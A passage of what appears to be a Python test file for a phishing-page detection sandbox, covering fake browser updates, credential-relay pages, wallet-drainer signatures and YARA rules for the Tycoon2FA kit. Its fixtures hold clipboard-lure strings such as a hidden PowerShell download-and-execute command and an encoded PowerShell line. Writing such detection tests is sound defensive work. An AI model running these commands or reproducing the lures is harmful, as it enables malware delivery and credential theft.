                downloads=[{"sha256": "aa", "suggested_filename": "ChromeSetup.exe"}])  # noqa: E501
    data.download_heads = {"aa": b"MZ\x90\x00"}
    assert "fake_browser_update" in _hits(data)
    # browser-update.org banner that only links to the vendor (vendor host, no download here).
    ok = _page("https://browser-update.org/", title="Update", text="Your browser is out of date")
    assert "fake_browser_update" not in _hits(_cap("https://browser-update.org/", [ok]))


def test_smuggled_credential_page_fires_and_https_page_is_quiet():
    blob = _page("blob:https://host.example/uuid", forms=[PASSWORD_FORM])
    assert "smuggled_credential_page" in _hits(_cap("https://host.example/", [blob]))
    normal = _page("https://host.example/login", forms=[PASSWORD_FORM])
    assert "smuggled_credential_page" not in _hits(_cap("https://host.example/login", [normal]))


def test_ipfs_credential_page_fires_and_nft_metadata_is_quiet():
    cid = "bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi"
    url = f"https://{cid}.ipfs.dweb.link/"
    page = _page(url, title="Sign in", forms=[PASSWORD_FORM])
    assert "ipfs_credential_page" in _hits(_cap(url, [page]))
    meta = _page(url, title="NFT", text="token metadata")
    assert "ipfs_credential_page" not in _hits(_cap(url, [meta]))


def test_client_side_ip_lookup_fires_with_context_and_is_quiet_alone():
    har = [_req("https://ip-api.com/json")]
    with_cmd = _cap("https://lure.example/", har=har,
                    clipboard=[{"page": "p0", "api": "x", "text": "powershell -enc " + "A" * 60}])  # noqa: E501
    assert "client_side_ip_geo_lookup" in _hits(with_cmd)
    assert "client_side_ip_geo_lookup" not in _hits(_cap("https://store.example/", har=har))


def test_credential_relay_websocket_fires_and_bare_socket_is_quiet():
    frames = [{"url": "wss://relay.example/socket.io/", "direction": "sent", "event": "recieveid"}]
    brand = _page("https://m365-clone.example/", title="Sign in to your account",
                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
    assert "credential_relay_websocket" in _hits(_cap("https://m365-clone.example/", [brand], websocket_frames=frames))  # noqa: E501
    plain = _page("https://chat.example/", title="Chat", text="support")
    assert "credential_relay_websocket" not in _hits(_cap("https://chat.example/", [plain], websocket_frames=frames))  # noqa: E501


def test_devtools_blocking_fires_with_context_and_is_quiet_alone():
    blocked = [{"kind": "devtools_key", "key": "F12"}, {"kind": "contextmenu"}]
    clip = [{"page": "p0", "api": "x", "text": "powershell -w hidden -c \"irm x|iex\""}]
    assert "devtools_blocking" in _hits(_cap("https://kit.example/", clipboard=clip, blocked_input=blocked))  # noqa: E501
    assert "devtools_blocking" not in _hits(_cap("https://gallery.example/", blocked_input=blocked))


def test_wallet_drainer_signature_fires_and_dex_approval_is_quiet():
    drain = [{"method": "eth_signTypedData_v4", "primaryType": "PermitBatch"}]
    assert "wallet_drainer_signature" in _hits(_cap("https://claim-airdrop.example/", wallet_requests=drain))  # noqa: E501
    # A real DEX on an allowlisted domain: a Permit on Uniswap is expected.
    ok = _cap("https://app.uniswap.org/", wallet_requests=drain, allowlisted=["uniswap.org"])
    assert "wallet_drainer_signature" not in _hits(ok)


def test_tycoon2fa_web_yara():
    kit = b'socket.on("recieveid",f);function tryfindingele(){};var x=".btn-blue-next-btn"'
    assert _yara("tycoon2fa_web").match(data=kit)
    assert not _yara("tycoon2fa_web").match(data=b'<form><input type=password></form>')


def test_crypto_decrypt_then_write_yara():
    page = b'var t=CryptoJS.AES.decrypt(d,k).toString();document.write("' + b"QUJD" * 300 + b'")'
    assert _yara("crypto_decrypt_then_write").match(data=page)
    assert not _yara("crypto_decrypt_then_write").match(data=b"CryptoJS.AES.decrypt(x,k)")


def test_extra_free_hosting_platforms_are_tenanted():
    from sandbox.analysis.domains import free_hosting, site

    assert free_hosting("kit.storage.dev") == "storage.dev"
    assert site("kit.storage.dev") == "kit.storage.dev"
